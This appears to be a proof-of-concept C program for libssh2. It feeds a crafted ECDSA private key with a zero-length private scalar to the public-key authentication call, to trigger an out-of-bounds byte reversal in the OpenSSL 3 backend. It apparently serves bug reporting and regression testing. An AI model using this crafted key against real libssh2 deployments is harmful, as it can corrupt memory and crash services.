/*
 * PoC: libssh2_userauth_publickey_frommemory() with a crafted
 * openssh-key-v1 ECDSA private key whose private scalar mpint is
 * zero-length. On the OpenSSL 3 backend, key parsing reaches
 * ossl_swap_bytes() with a zero length, which underflows len - 1 and
 * runs the in-place byte reversal out of bounds.
 *
 * No network I/O is involved: the private key is parsed locally before
 * any packet is sent.
 */
#include <libssh2.h>

#include <stdio.h>

static const char crafted_key[] =
    "-----BEGIN OPENSSH PRIVATE KEY-----\n"
    "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAAQAAAAA0ESIzRB\n"
    "EiM0QAAAATZWNkc2Etc2hhMi1uaXN0cDI1NgAAAAhuaXN0cDI1NgAAAAEAAAAAAA==\n"
    "-----END OPENSSH PRIVATE KEY-----\n";

int main(void)
{
    LIBSSH2_SESSION *session;
    int rc;

    if(libssh2_init(0) != 0) {
        fprintf(stderr, "libssh2_init failed\n");
        return 2;
    }

    session = libssh2_session_init();
    if(!session) {
        fprintf(stderr, "libssh2_session_init failed\n");
        return 2;
    }

    rc = libssh2_userauth_publickey_frommemory(session,
                                               "user", 4,
                                               NULL, 0,
                                               crafted_key,
                                               sizeof(crafted_key) - 1,
                                               NULL);
    printf("libssh2_userauth_publickey_frommemory returned %d\n", rc);

    libssh2_session_free(session);
    libssh2_exit();
    return 0;
}
